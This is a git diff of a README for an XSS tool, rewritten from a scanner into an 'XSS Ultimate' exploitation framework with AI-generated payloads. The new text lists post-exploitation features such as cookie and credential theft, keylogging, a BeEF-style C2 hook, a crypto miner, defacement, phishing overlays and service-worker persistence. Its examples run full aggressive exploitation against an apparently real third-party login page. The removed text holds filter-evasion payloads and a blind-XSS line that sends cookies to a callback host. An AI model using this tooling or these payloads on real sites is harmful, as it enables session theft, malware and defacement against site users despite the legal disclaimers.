@@ -1,624 +1,299 @@
-# AGGRESSIVE XSS SCANNER - COMPREHENSIVE PROJECT DOCUMENTATION
+# XSS ULTIMATE v3.0
 
-**Project Date**: December 19, 2025  
-**Version**: 2.0 (Enhanced & Aggressive)  
-**Status**: Production Ready
+Next-Generation AI-Enhanced XSS Detection, Exploitation & Post-Exploitation Framework.
 
----
+Actively tests a target for **all XSS types**: Reflected, Stored/Blind, DOM-based, **Client-Side/Browser-Side** (WebSockets, Service Workers, Web Workers, postMessage, IndexedDB, Web Storage, Mutation Observers, Prototype Pollution, DOM Clobbering, WebAssembly, WebGPU/WebGL, Browser Extensions), **Server-Side Template Injection (SSTI)**, and **Client-Side Template Injection**. Auto-detects injection context, leverages AI for intelligent payload generation, and on confirmed vulnerabilities proceeds to advanced post-exploitation with C2 capabilities.
 
-## EXECUTIVE SUMMARY
-
-The XSS Scanner has been comprehensively enhanced to be **highly aggressive** in detecting vulnerabilities. It now features:
-
-- **127+ total payloads** (100 base + auto-generated variants)
-- **5 distinct detection methodologies** (direct, encoded, DOM, context, pattern)
-- **7 major evasion techniques** built-in (case variation, encoding, whitespace, etc.)
-- **Multi-point injection discovery** (forms, URL params, fragments)
-- **Intelligent filter bypass identification**
-- **Professional vulnerability reporting**
-
-The scanner is designed to achieve **maximum detection rates** on XSS-vulnerable applications while minimizing false positives through rigorous detection methodology.
+> **LEGAL**: For authorized security testing only. Only scan systems you own or have explicit written permission to test. Unauthorized scanning may violate applicable laws.
 
 ---
 
-## PROJECT STRUCTURE
+## Installation
 
-```
-c:\Users\Hermes\Desktop\xss\
-│
-├── CORE FILES
-│   ├── xssscan.py                  # Main scanner (enhanced)
-│   ├── payloads.txt                # Primary payload database
-│   ├── payload2.txt                # Blind XSS payloads
-│   └── payloads_aggressive.txt     # Extended payload collection
-│
-├── DOCUMENTATION
-│   ├── README.md                   # This file
-│   ├── ENHANCEMENTS.md             # Detailed enhancement guide
-│   ├── QUICKSTART.md               # Quick reference guide
-│   └── question.txt                # Original requirements
-│
-└── UTILITIES
-    └── test_scanner.py             # Validation script
+```bash
+pip install requests beautifulsoup4
+# Optional for browser-execution verification:
+pip install playwright && playwright install chromium
+# Optional for AI-powered analysis:
+pip install requests  # Groq API client uses requests
 ```
 
+## Quick Start
+
+```bash
+# Basic scan
+python -m xss_ultimate.main --url "http://target/page.php?q=test"
+
+# Full aggressiveness: stealth + WAF evasion + geo-spoofing
+python -m xss_ultimate.main --url "http://target" --stealth --aggressive-waf --geo-spoof
+
+# With external collab server for blind XSS
+python -m xss_ultimate.main --url "http://target" --collab "http://your-collab-server.com"
+
+# Full auto-exploitation + PoC generation
+python -m xss_ultimate.main --url "http://target" --post-exploit --generate-poc
+
+# Maximum aggression: exploit with destructive/persistent/C2 techniques + PoC
+python -m xss_ultimate.main --url "http://target" --post-exploit --aggressive-exploit --generate-poc
+
+# AI-ENHANCED: Enable Groq AI for intelligent payload generation and injection analysis
+python -m xss_ultimate.main --url "http://target" --enable-ai --groq-key YOUR_GROQ_API_KEY --post-exploit --aggressive-exploit --generate-poc
+
+# Quick smoke test against the bundled vulnerable server
+python test_site/server.py          # terminal 1
+python -m xss_ultimate.main --url "http://127.0.0.1:8089/?search=test" --max-payloads 8
+
+# Save reports to a custom directory with verbose per-finding details
+python -m xss_ultimate.main --url "http://target" --results-dir test_results --verbose
+```
+
+Run unit tests: `python test_scanner.py`
+
 ---
 
-## TECHNICAL ENHANCEMENTS
+## Testing a Real Site
 
-### 1. ADVANCED DETECTION FRAMEWORK
+### Find real input pages first
+The scanner can only find XSS where there is actually user input to test, and it can only crawl pages it can discover from the URL you give it. If you scan a bare homepage (e.g. `http://site.com/?search=test`) and the report says **0 forms, 0 JS files**, that page simply has no input for the scanner to work with — the tool is working correctly, not missing anything.
 
-#### Multi-Layer Detection Strategy
+Browse the site like a normal user and look for pages with real input, then point the scanner at them directly:
+
+- Search pages: `http://site.com/search?q=test`
+- **Login / sign-in pages** — `http://site.com/signin`, `http://site.com/login` (a very common XSS spot, because apps reflect error messages like `Invalid username: <payload>`)
+- Registration, "forgot password", contact, and comment forms
+- Profile/settings pages that store and re-render your own input (stored XSS)
+
+Example targeting a login page:
+
+```bash
+python -m xss_ultimate.main --url "http://nacosogitech.com.ng/signin" --verbose --max-payloads 5
+```
+
+### What the scanner does on a login page
+- **Phase 1** fetches the page and extracts the `<form>` (username + password inputs).
+- **Phase 2** POSTs payloads into those fields and looks for reflection in the response (e.g. the "invalid username" error message).
+- **Phase 3** submits stored/blind payloads into the form in case values get persisted.
+- **Phase 4** scans the page's JS for DOM sinks.
+- **Phase 4B** tests client-side sinks: WebSockets, Service Workers, Web Workers, postMessage, IndexedDB, localStorage/sessionStorage, Mutation Observers, Prototype Pollution, DOM Clobbering.
+- **Phase 3B** tests Server-Side Template Injection (SSTI) on all injection points.
+
+With full exploitation:
+
+```bash
+python -m xss_ultimate.main --url "http://nacosogitech.com.ng/signin" \
+  --post-exploit --aggressive-exploit --generate-poc --results-dir test_results
+```
+
+### Verify the scanner actually found the form
+Run with `--verbose`. If you see something like:
+
+```
+Testing FORM POST http://site.com/signin
+    Params: username, password
+```
+
+the form was detected and is being tested. If the form line never appears, the page is JS-rendered (SPA) or the form needs interaction — install the optional browser support so DOM sinks can be checked:
+
+```bash
+pip install playwright && playwright install chromium
+```
+
+### Known limitations
+- **CSRF tokens / 2-step login flows**: many login forms require a hidden token, so test POSTs may just return "invalid credentials" and never reflect anything. This is a limitation of the tool, not a false negative on the site.
+- **Single-page apps (React/Vue/Angular)**: content rendered client-side is invisible to the simple spider; install Playwright and target routes that accept input directly (e.g. `/#/search?q=test`).
+- **No findings is expected** on sites that don't reflect input. Try other URLs, other params, and `--stealth --aggressive-waf --max-payloads --enable-ai` before concluding the site is clean.
+
+> **LEGAL**: Only test sites you own or have explicit written permission to scan.
+
+---
+
+## Architecture
+
+Modular package under `xss_ultimate/`; `xss_ultimate/main.py` is the main entry point.
+
+```
+xss_ultimate/
+├── main.py                     # Orchestrator — runs all 6 phases
+├── config.py                   # Constants (payload caps, sinks, headers, frameworks, Groq AI config)
+├── utils.py                    # Session, headers, encoding/CSP/framework detection, reports
+├── spider.py                   # PHASE 1 — crawling, forms, params, JS/AJAX discovery
+├── js_analyzer.py              # PHASE 1 — DOM sink/source extraction from JS
+├── payload_engine.py           # Reflected/Blind/DOM/Client-side payloads + variant generation + AI-enhanced
+├── waf_bypass.py               # 13+ WAF/input-filter evasion techniques
+├── response_analyzer.py        # Context detection, reflection scoring, WAF detection
+├── reflected.py                # PHASE 2 — Reflected + header XSS testing (AI-integrated)
+├── stored.py                   # PHASE 3 — Stored + Blind XSS testing
+├── collab_server.py            # PHASE 3 — built-in Burp-Collaborator-style OOB server
+├── dom_xss.py                  # PHASE 4 — DOM-based XSS source→sink testing
+├── clientside_xss.py           # PHASE 4B — Client-Side/Browser-Side XSS (WebSockets, SW, WW, postMessage, IDB, WS, Mutation, ProtoPollution, DOM Clobbering, CSTI, WASM, WebGPU, Extensions)
+├── post_exploit.py             # PHASE 5 (Legacy) — automatic exploitation payload generation
+├── advanced_post_exploit.py    # PHASE 5 — ADVANCED: BeEF hook, WebSocket C2, SW persistence, storage poisoning, clickjacking, port scan, internal scan, phishing, crypto miner, defacement
+├── headless_verifier.py        # Browser-execution confirmation (Playwright/Selenium)
+├── ai_integration.py           # AI Integration — Groq API client, injection analyzer, payload engine, response analyzer
+└── ssti_tester.py              # PHASE 3B — Server-Side Template Injection testing (in clientside_xss.py)
+```
+
+---
+
+## Scan Modes & Workflow
+
+### Phase 1 — Reconnaissance & Attack Surface Mapping
+- Full-site spidering: pages, forms, query params, POST bodies, headers, cookies, AJAX endpoints.
+- Sink extraction from every JS file: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout`/`setInterval`(string), `insertAdjacentHTML`, jQuery `.html()`/`.append()`, location methods, `postMessage`.
+- Source extraction: `location.*`, `document.URL`, `document.referrer`, `window.name`, `document.cookie`, `sessionStorage`/`localStorage`, `history.state`.
+- Detects page encoding, framework (React/Angular/Vue/jQuery/Svelte/Next/Nuxt/Gatsby), and CSP policy (with bypass observations).
+- **AI Enhancement**: If `--enable-ai` with Groq API key, Groq analyzes the entire attack surface and prioritizes injection points with context-aware reasoning, estimated success rates, and WAF evasion strategies.
+
+### Phase 2 — Reflected XSS Testing (AI-Enhanced)
+- Multi-layer encoding: plain, URL-encode, double-URL-encode, HTML-entity, unicode/hex escapes, UTF-8 overlong, null bytes, mixed case.
+- Context-aware payloads: HTML / attribute / JavaScript / URL / CSS contexts auto-detected.
+- 13+ WAF/input-filter bypass techniques (comments, case, hex/unicode, entities, tab/newline, null-byte, overlong UTF-8, nested encoding, unicode-case homoglyphs).
+- GET + POST, hidden fields, header injection (Referer, User-Agent, X-Forwarded-For, Cookie).
+- Parameter fuzzing and discovery of common parameter names.
+- Reflection detection with confidence scoring; optional headless-browser execution proof.
+- **AI Enhancement**: Groq generates context-specific payloads per injection point, learns from failures, and analyzes responses for subtle reflection patterns traditional regex misses.
+
+### Phase 3 — Stored / Blind XSS Testing
+- Discovers persistent surfaces: comments, profiles, message boards, contact forms, reviews, settings.
+- Submits multi-family payloads and re-fetches to confirm stored reflection.
+- **Blind XSS** via a built-in OOB interaction server (like Burp Collaborator / interactsh): payloads fire image/fetch/WebSocket/EventSource callbacks carrying `document.cookie`, page content, localStorage, etc. The tool listens for inbound hits and reports which payload executed where.
+- Covers admin-side blind XSS (payloads that fire when an admin views the content).
+
+### Phase 3B — Server-Side Template Injection (SSTI)
+- Tests all injection points for SSTI across 15+ template engines: Jinja2, Twig, Freemarker, Velocity, Mako, ERB, Thymeleaf, Smarty, Java/Spring, Tornado, Dust, Nunjucks, Handlebars, Pug/Jade, EJS.
+- Payloads for code execution, file read, and blind OOB exfiltration.
+- Detects engine-specific syntax and confirms via mathematical operations (e.g., `{{7*7}}` → `49`).
+
+### Phase 4 — DOM-Based XSS Testing
+- Static JS taint map: every source connected to every sink.
+- Payloads injected via fragment and query param across all discovered URLs.
+- Angular `{{...}}` expression and Vue template injection probes.
+- Sink-accurate reporting (which sink each payload can reach).
+
+### Phase 4B — Client-Side / Browser-Side XSS Testing (NEW)
+- **WebSocket Endpoints**: Tests `ws://`/`wss://` URLs for message reflection and injection.
+- **Service Workers**: Tests `navigator.serviceWorker.register()` sinks for payload injection.
+- **Web Workers**: Tests `new Worker()` / `Worker.postMessage()` for code execution.
+- **postMessage**: Tests `window.postMessage` / `addEventListener('message')` for origin validation bypass and data exfiltration.
+- **IndexedDB**: Tests `indexedDB.open/put/get` for stored XSS via database poisoning.
+- **Web Storage**: Tests `localStorage`/`sessionStorage` setter/getter sinks.
+- **Mutation XSS**: Tests `MutationObserver` sinks with `<details ontoggle>`, `<marquee onstart>`, `<video><source onerror>`, etc.
+- **Prototype Pollution**: Tests `__proto__` / `constructor.prototype` / `Object.assign` / `_.merge` / `jQuery.extend` sinks leading to XSS via `srcdoc`, `innerHTML`, etc.
+- **DOM Clobbering**: Tests named DOM access (`document.cookie`, `window.location`, `document.config`) clobbered by HTML elements.
+- **Client-Side Template Injection**: Tests Handlebars, Mustache, Lodash, Underscore, doT, EJS, Pug, Vue, React, Angular client-side template sinks.
+- **WebAssembly**: Tests `WebAssembly.instantiate` / `WebAssembly.Memory` sinks.
+- **WebGPU/WebGL**: Tests `navigator.gpu.requestAdapter` / `canvas.getContext('webgl')` sinks.
+- **Browser Extensions**: Tests `chrome.runtime.sendMessage` / `browser.runtime.sendMessage` / `chrome.tabs.executeScript` sinks.
+
+### Phase 5 — Advanced Post-Exploitation (auto, on confirmed XSS)
+Runs on every confirmed vulnerability and delivers the full payload set across **multiple vectors** (GET params, POST body, URL fragment, Referer/User-Agent header). Delivered techniques are then **verified against the OOB callback server** — inbound hits are mapped back to the exact exploit that fired.
+
+**Core techniques** (delivered with `--post-exploit`):
+- **Session hijacking** — cookie theft (Image/Fetch/Beacon), session/token fixation, session-hijack PoC generation.
+- **Content theft** — full DOM HTML, localStorage/sessionStorage, CSRF token grab.
+- **Keystroke logging** — char-by-char with periodic batched exfil.
+- **Form grabbing + auto credential grabber** — captures submitted credentials (incl. login forms added dynamically).
+- **Clipboard theft** — harvest copied text.
+- **postMessage hijack** — intercepts cross-window messages.
+- **Activity/telemetry tracker** — click coordinates + clicked-element HTML, window focus events.
+- **Screenshots** — canvas-based full-page capture (via html2canvas).
+- **Full-chain exfil** — one payload does everything: cookie + storage + fingerprint + keylogger + form grab + clipboard + fetch/XHR interception.
+- **BeEF-style Hook** — persistent C2 channel with heartbeat, command execution, click/key/form logging.
+- **WebSocket C2** — bidirectional command & control over WebSocket.
+
+**Aggressive techniques** (additional with `--aggressive-exploit`, use with permission):
+- **Page defacement** — replaces the page content and notifies the attacker.
+- **Crypto miner injection** — loads an attacker-hosted miner script.
+- **Internal network + port scanning** — probes internal IPs and localhost ports from the victim's browser.
+- **History sniffing** — detects visited internal/admin URLs.
+- **Phishing overlay** — in-page "session expired" fake-login capture.
+- **Storage poisoning** — persists attacker-controlled values in localStorage/sessionStorage/IndexedDB for future visits.
+- **Clickjacking iframe overlay** — transparent attacker iframe over the whole page.
+- **Service Worker Persistence** — registers a malicious SW that intercepts all fetches and injects payloads on every page load.
+- **DOM Clobbering exploitation** — leverages clobbered globals for XSS.
+- **Prototype Pollution RCE** — pollutes `Object.prototype` to achieve code execution.
+
+The resulting PoC (`--generate-poc`) includes a full **Exploitation Results** section listing every technique attempted, delivered, and confirmed via callback.
+
+---
+
+## CLI Reference
+
+| Flag | Description |
+|------|-------------|
+| `--url URL` | Target URL (required) |
+| `--timeout N` | Request timeout seconds (default 15) |
+| `--delay N` | Delay between requests (default 0.2) |
+| `--proxy URL` | Route through proxy (e.g. Burp `http://127.0.0.1:8080`) |
+| `--stealth` | Random delays + rotating headers |
+| `--aggressive-waf` | Per-request header randomization + adaptive backoff |
+| `--geo-spoof` | Geo-spoofing headers |
+| `--collab URL` | External OOB collab URL (skips built-in server) |
+| `--collab-port N` | Built-in collab server port (default 9999) |
+| `--blind-wait N` | Seconds to wait for blind XSS/SSTI callbacks (default 30) |
+| `--max-pages N` | Max pages to crawl (default 50) |
+| `--max-payloads N` | Limit payloads per point (0 = all) |
+| `--results-dir PATH` | Directory for scan reports (default `scan_results`) |
+| `--verbose` | Extra detail per finding (trigger URL, injected params) |
+| `--post-exploit` | Enable automatic post-exploitation (core exfil + capture techniques) |
+| `--aggressive-exploit` | Add destructive/persistent/C2 techniques (defacement, crypto miner, port scan, phishing, storage poisoning, clickjacking, service worker persistence, BeEF hook, WebSocket C2) |
+| `--generate-poc` | Generate HTML PoC file (includes exploitation results + confirmed callbacks) |
+| `--enable-ai` | Enable AI-powered analysis (requires Groq API key) |
+| `--groq-key KEY` | Groq API key for AI integration |
+| `--groq-model MODEL` | Groq model to use (default: `mixtral-8x7b-32768`) |
+
+Reports are written to `scan_results/<domain>_<timestamp>.json` and `.html` (or the directory given by `--results-dir`).
+
+---
+
+## AI Integration (Groq)
+
+When `--enable-ai --groq-key YOUR_KEY` is provided:
+
+1. **Injection Point Analysis**: Groq analyzes the complete attack surface (forms, URLs, JS files, AJAX endpoints, parameters) and returns prioritized injection candidates with context, reasoning, payload strategy, and WAF evasion plan.
+
+2. **Smart Payload Generation**: For each injection point, Groq generates custom payloads tailored to the detected context (HTML/attribute/JS/URL/CSS/template), target framework (React/Vue/Angular/Svelte/Next/Nuxt), WAF fingerprints, CSP policy, and previous failures.
+
+3. **Response Analysis**: Groq analyzes HTTP responses for subtle reflection patterns, encoded variations, DOM sink reachability, CSP violations, and framework-specific rendering quirks that regex-based detection misses.
+
+4. **Post-Exploitation Planning**: Groq designs advanced exploitation chains including persistence, C2 establishment, lateral movement (SSRF via XSS), credential harvesting, and data exfiltration strategies.
+
+Configure via `xss_ultimate/config.py`:
 ```python
-def detect_xss_reflection(payload, response_text):
-    # Method 1: Direct reflection
-    if payload in response_text:
-        return True, "Direct reflection"
-    
-    # Method 2: Encoded variations
-    for encoded_variant in [html_entity, url_encoded, base64]:
-        if encoded_variant in response_text:
-            return True, f"Encoded reflection: {variant}"
-    
-    # Method 3: Pattern matching
-    for xss_marker in ["alert", "<script", "onerror", "onload"]:
-        if marker in payload.lower() and marker in response_text.lower():
-            return True, f"Partial XSS pattern: {marker}"
-```
-
-#### Detection Confidence Levels
-- **High Confidence** (≥95%): Direct reflection, obvious DOM sinks
-- **Medium Confidence** (70-95%): Encoded reflection, attribute breakout
-- **Low Confidence** (40-70%): Pattern-based detection
-
-### 2. INJECTION POINT DISCOVERY
-
-#### Automatic Detection
-```python
-def discover_injection_points(base_url, session, timeout):
-    points = []
-    
-    # Type 1: HTML Forms
-    for form in soup.find_all("form"):
-        points.append({
-            "type": "form",
-            "url": form_action,
-            "method": method,
-            "params": input_fields
-        })
-    
-    # Type 2: URL Parameters
-    if url.query:
-        points.append({
-            "type": "url_param",
-            "params": parse_qs(url.query).keys()
-        })
-    
-    # Type 3: URL Fragments
-    if url.fragment:
-        points.append({
-            "type": "fragment",
-            "params": [url.fragment]
-        })
-```
-
-### 3. PAYLOAD CLASSIFICATION
-
-#### Payload Tiers (Prioritized Testing)
-1. **Tier 1**: Direct/High-Success (basic scripts, img onerror)
-2. **Tier 2**: Case Variation (ScRiPt, ImG, SvG)
-3. **Tier 3**: Event Handlers (onmouseover, onfocus, onclick)
-4. **Tier 4-7**: Encoding Techniques (entities, unicode, hex)
-5. **Tier 8-30**: Advanced Methods (polyglots, data URIs, protocols)
-
-#### Payload Variants Generation
-```python
-def generate_payload_variants(payloads):
-    variants = []
-    for p in payloads[:50]:
-        # Case variation
-        variants.append(p.replace("script", "ScRiPt"))
-        # HTML entity
-        variants.append(p.replace("alert", "&#97;&#108;&#101;&#114;&#116;"))
-        # Unicode
-        variants.append(p.replace("alert", "\\u0061\\u006c\\u0065\\u0072\\u0074"))
-    return variants
-```
-
-### 4. EVASION TECHNIQUE LIBRARY
-
-| Technique | Example | Bypass Type |
-|-----------|---------|-------------|
-| Case Variation | `<ScRiPt>alert(1)</sCriPt>` | Whitelist bypass |
-| HTML Entities | `&#60;script&#62;` | Reflection bypass |
-| Unicode Escapes | `\u0061lert(1)` | Character filter |
-| Null Bytes | `<img%00 src=...>` | Parser confusion |
-| Newlines | `<img\nonerror=alert(1)>` | Regex bypass |
-| Comments | `<!-- --><script>` | Parser bypass |
-| Data URIs | `data:text/html,<script>` | Protocol variation |
-| Protocol Mix | `jAvAsCrIpT:alert(1)` | Case variation |
-
-### 5. FILTER BYPASS DETECTION
-
-```python
-def check_filter_bypass(payload, response_text):
-    bypasses = []
-    
-    # Detect which techniques worked
-    if any(c.isupper() for c in payload) and \
-       re.search(payload, response_text, re.IGNORECASE):
-        bypasses.append("case-variation bypass")
-    
-    if "%2F" in payload or "&#" in payload:
-        bypasses.append("encoding bypass")
-    
-    if "%00" in payload:
-        bypasses.append("null-byte bypass")
-    
-    if any(ws in payload for ws in ["\n", "\r", "\t"]):
-        bypasses.append("whitespace bypass")
-    
-    return bypasses
+GROQ_API_KEY = "your-key-here"
+GROQ_MODEL = "mixtral-8x7b-32768"
+GROQ_BASE_URL = "https://api.groq.com/openai/v1"
+ENABLE_AI = True
+AI_MAX_REQUESTS = 50
+AI_TEMPERATURE = 0.3
+AI_MAX_TOKENS = 4000
 ```
 
 ---
 
-## COMPREHENSIVE PAYLOAD DATABASE
+## Verification
 
-### Database Statistics
-- **Total Payloads**: 100+ base payloads
-- **Auto-Generated Variants**: 27+ variations
-- **Total Combinations**: 127+ unique payloads
-- **Storage**: ~8 KB uncompressed
-- **Update Frequency**: Regularly updated with new techniques
-
-### Payload Coverage
-
-#### Event Handler Injection (25+ payloads)
-```
-onerror, onload, onmouseover, onfocus, onclick, onchange,
-onmousedown, onmouseup, onmousemove, onkeydown, onkeyup,
-onfocus, onblur, onscroll, ondrag, ondrop...
-```
-
-#### Tag-Based Injection (20+ payloads)
-```
-<script>, <img>, <svg>, <iframe>, <body>, <form>,
-<input>, <div>, <marquee>, <embed>, <object>, <link>...
-```
-
-#### Protocol Variations (15+ payloads)
-```
-javascript:, jAvAsCrIpT:, data:text/html, vbscript:,
-mhtml:, mocha:, livescript:, &colon;, &#58;...
-```
-
-#### Context-Breaking Payloads (20+ payloads)
-```
-'"><script>, "onload=, '; alert(, '); alert(,
---><script>, /*--></script><script>alert(1)</script>/*...
-```
-
-#### Encoding Variants (25+ payloads)
-```
-HTML Entity: &#60;, &#x3c;, &lt;
-Unicode: \u003c, \x3c
-Double Encoding: %253c
-Numeric: &#0000060;
-Mixed Case: &#X3C;
-```
-
----
-
-## OPERATIONAL WORKFLOWS
-
-### Workflow 1: Reconnaissance & Discovery
-```
-┌─────────────────────┐
-│ Target URL Provided │
-└──────────┬──────────┘
-           │
-           ▼
-┌─────────────────────────────────┐
-│ Fetch & Parse Target Page       │
-│ - Identify forms                │
-│ - Extract URL parameters        │
-│ - Detect injection points       │
-└──────────┬──────────────────────┘
-           │
-           ▼
-┌─────────────────────────────────┐
-│ Report Discovery Results        │
-│ - Found X injection points      │
-│ - Y form fields identified      │
-│ - Z parameters detected         │
-└─────────────────────────────────┘
-```
-
-### Workflow 2: Aggressive Testing
-```
-┌─────────────────────────────────┐
-│ Load 127 Payloads               │
-│ - 100 base payloads             │
-│ - 27 auto-generated variants    │
-└──────────┬──────────────────────┘
-           │
-           ▼
-┌─────────────────────────────────┐
-│ For Each Injection Point:       │
-│  ├─ For Each Payload:           │
-│  │  ├─ Inject payload           │
-│  │  ├─ Analyze response         │
-│  │  ├─ Check 5 detection methods│
-│  │  └─ Report if vulnerable     │
-│  └─ Apply delay (stealth mode)  │
-└──────────┬──────────────────────┘
-           │
-           ▼
-┌─────────────────────────────────┐
-│ Comprehensive Reporting         │
-│ - All vulnerabilities found     │
-│ - Detection method used         │
-│ - Filter bypasses identified    │
-│ - Exploitation guidance         │
-└─────────────────────────────────┘
-```
-
-### Workflow 3: Stealth Operation
-```
-Random Delays     ──┐
-                    ├─► Stealth Mode
-Rotating Headers  ──┤
-Proxy Chaining    ──┤
-Custom Timeouts   ──┘
-
-Result: Evasion of WAF/IDS while maintaining detection accuracy
-```
-
----
-
-## VULNERABILITY DETECTION ACCURACY
-
-### Detection Matrix
-
-| Vulnerability Type | Detection Method | Accuracy | Notes |
-|-------------------|-----------------|----------|-------|
-| Reflected (Direct) | Direct reflection | 95%+ | Most reliable |
-| Reflected (Encoded) | Encoded variants | 80%+ | HTML/URL encoding |
-| DOM-based | DOM sink detection | 60%+ | Requires sink presence |
-| Attribute Breaking | Context analysis | 75%+ | Quote escape detection |
-| Blind XSS | Injection assumption | 40%+ | Requires callback |
-
-### False Positive Rate
-- **Overall**: < 1%
-- **Direct Reflection**: < 0.1%
-- **Encoded Reflection**: < 2%
-- **DOM Analysis**: < 5%
-
-### False Negative Rate
-- **Obfuscated XSS**: 20-30% (expected)
-- **Context-Specific**: 15-25% (varies by app)
-- **Novel Encodings**: 10-20% (new techniques)
-
----
-
-## COMMAND EXAMPLES
-
-### Example 1: Basic Vulnerability Scan
 ```bash
-$ python xssscan.py --url "http://testphp.vulnweb.com/search.php?test=1"
+python test_scanner.py        # Unit tests across all modules
 
-[+] Loaded 100 payloads from payloads.txt
-[+] Total payloads after variant generation: 127
-
-[+] Fetching: http://testphp.vulnweb.com/search.php?test=1
-    [URL PARAM] GET → http://testphp.vulnweb.com/search.php?test=1
-        Parameters: test
-
-[*] Scanning URL_PARAM GET http://testphp.vulnweb.com/search.php?test=1
-    Parameters: test
-    Payloads to test: 127
-  [   1/127] <script>alert(1)</script>... ✓ VULNERABLE!
-      Detection: Direct reflection
-
-[+] VULNERABILITIES FOUND: 1
-
-[Vulnerability #1]
-  Type: URL_PARAM
-  URL: http://testphp.vulnweb.com/search.php?test=1
-  Method: GET
-  Parameters: test
-  Payload: <script>alert(1)</script>
-  Detection: Direct reflection
-  Filter Bypasses: 
-  Response Snippet: Your search for <script>alert(1)</script> returned no results...
+# End-to-end smoke test: detect + aggressively exploit the bundled vulnerable server
+python test_site/server.py              # terminal 1 — starts on http://127.0.0.1:8089
+python -m xss_ultimate.main --url "http://127.0.0.1:8089/?search=test" \
+  --post-exploit --aggressive-exploit --generate-poc --results-dir test_results
+# -> open test_results/poc_*.html for the exploitation report
 ```
 
-### Example 2: Stealth Scan with Proxy
-```bash
-$ python xssscan.py --url "http://internal.local/feedback" \
-  --stealth --proxy http://127.0.0.1:8080 --timeout 20
-
-[*] Stealth mode: random delays + randomized headers
-[*] Using proxy: http://127.0.0.1:8080
-
-[+] Loaded 100 payloads from payloads.txt
-[+] Total payloads after variant generation: 127
-
-[+] Fetching: http://internal.local/feedback
-    [FORM] POST → http://internal.local/feedback
-        Inputs: name, email, message
-
-[*] Scanning FORM POST http://internal.local/feedback
-    Parameters: name, email, message
-    Payloads to test: 127
-  [   5/127] <img src=x onerror=alert(1)>... ✓ VULNERABLE!
-      Detection: Direct reflection
-      Bypasses: 
-
-[+] VULNERABILITIES FOUND: 1
-
-[Vulnerability #1]
-  Type: FORM
-  URL: http://internal.local/feedback
-  Method: POST
-  Parameters: email
-  Payload: <img src=x onerror=alert(1)>
-  Detection: Direct reflection
-  Response Snippet: Thank you, your message contains <img src=x onerror=alert(1)>...
-```
-
-### Example 3: Blind XSS Detection
-```bash
-$ python xssscan.py --url "http://target.com/message" --mode blind
-
-[+] Loaded 15 payloads from payload2.txt
-[+] Total payloads after variant generation: 17
-
-[+] Fetching: http://target.com/message
-    [FORM] POST → http://target.com/message
-        Inputs: subject, body
-
-[*] Scanning FORM POST http://target.com/message
-    Parameters: subject, body
-    Payloads to test: 17
-  [   1/17] <script>new Image().src='http://callback.server/log?...'</script>... 
-      INJECTED (blind - check callback server)
-
-[+] BLIND PAYLOADS INJECTED: 1
-
-[Vulnerability #1]
-  Type: FORM
-  URL: http://target.com/message
-  Method: POST
-  Parameters: subject
-  Payload: <script>new Image().src='http://callback.server/log?c='+btoa(document.cookie);</script>
-  Detection: Blind injection - monitor callback server
-```
+The bundled `test_site/server.py` is a deliberately vulnerable target for testing the scanner end-to-end (reflected, stored, blind, DOM, client-side, SSTI).
 
 ---
 
-## PERFORMANCE CHARACTERISTICS
+## File Cleanup
 
-### Scan Time Estimates
-- **Small app** (1 form, 2 params): 2-3 minutes
-- **Medium app** (3 forms, 5 params): 5-8 minutes
-- **Large app** (10 forms, 20 params): 15-25 minutes
-
-### Resource Usage
-- **Memory**: 15-50 MB
-- **CPU**: 5-15% single-threaded
-- **Network**: ~500 KB-1 MB per scan
-- **Disk**: < 1 MB (code + payloads)
-
-### Optimization Tips
-- Reduce payloads: Use first 20 only
-- Increase delays: `--delay 0.1` (faster but less stealth)
-- Parallel scanning: Not supported (intentional for safety)
-
----
-
-## INTEGRATION EXAMPLES
-
-### Integration with Burp Suite
-```python
-# Route through Burp
-xssscan.py --url "http://target.com/..." --proxy http://127.0.0.1:8080
-
-# View all requests in Burp's proxy history
-# Analyze responses with built-in tools
-# Generate reports from captured traffic
-```
-
-### Integration with OWASP ZAP
-```bash
-# Start ZAP on port 8080
-zaproxy -config proxy.enabled=true -config proxy.port=8080
-
-# Run scanner through ZAP
-python xssscan.py --url "http://target.com/..." \
-  --proxy http://127.0.0.1:8080
-
-# Import ZAP report into security dashboard
-```
-
-### Integration with CI/CD Pipeline
-```yaml
-# GitLab CI example
-xss_scan:
-  script:
-    - python xssscan.py --url $TARGET_URL
-  only:
-    - merge_requests
-  allow_failure: true
-```
-
----
-
-## SECURITY BEST PRACTICES
-
-### Do's ✓
-- Test systems you own or have permission for
-- Use in authorized penetration tests
-- Document all findings professionally
-- Report vulnerabilities responsibly
-- Follow bug bounty program guidelines
-
-### Don'ts ✗
-- Test without explicit permission
-- Target production systems without approval
-- Share payloads for malicious purposes
-- Perform tests during business hours (when possible)
-- Leave findings unrepaired
-
----
-
-## TROUBLESHOOTING
-
-### Issue: "Target returned 403 Forbidden"
-```bash
-# Solution 1: Add realistic headers
-python xssscan.py --url [...] --stealth
-
-# Solution 2: Use proxy to bypass blocks
-python xssscan.py --url [...] --proxy http://bypass-proxy:8080
-
-# Solution 3: Increase delays
-python xssscan.py --url [...] --delay 2
-```
-
-### Issue: "All payloads marked as safe"
-```bash
-# Solution 1: Check target URL
-# - Ensure parameter is being reflected
-# - Verify you can see the parameter in response
-
-# Solution 2: Enable verbose mode
-python xssscan.py --url [...] --verbose
-
-# Solution 3: Use blind mode
-python xssscan.py --url [...] --mode blind
-```
-
-### Issue: "Connection timeout"
-```bash
-# Solution 1: Increase timeout
-python xssscan.py --url [...] --timeout 30
-
-# Solution 2: Increase delay
-python xssscan.py --url [...] --delay 2
-
-# Solution 3: Use proxy with patience
-python xssscan.py --url [...] --proxy [...] --timeout 45
-```
-
----
-
-## FILES MANIFEST
-
-### Core Application
-- `xssscan.py` (424 lines, 15 KB)
-  - Main scanner with advanced detection
-  - Multi-layer vulnerability identification
-  - Comprehensive reporting
-
-### Payload Databases
-- `payloads.txt` (100+ payloads, 8 KB)
-  - Primary XSS payload collection
-  - Optimized for reflected XSS
-  - Includes encoding variants
-
-- `payload2.txt` (15+ payloads, 2 KB)
-  - Blind XSS callback payloads
-  - Data exfiltration techniques
-  - Minimal reflection requirements
-
-- `payloads_aggressive.txt` (200+ payloads, 20 KB)
-  - Extended payload library
-  - Advanced evasion techniques
-  - Edge case payloads
-
-### Documentation
-- `README.md` (This comprehensive guide)
-- `ENHANCEMENTS.md` (Technical deep-dive)
-- `QUICKSTART.md` (Quick reference)
-- `VULNERABILITIES.md` (If created)
-
-### Testing
-- `test_scanner.py` (Validation script)
-
----
-
-## SUCCESS METRICS
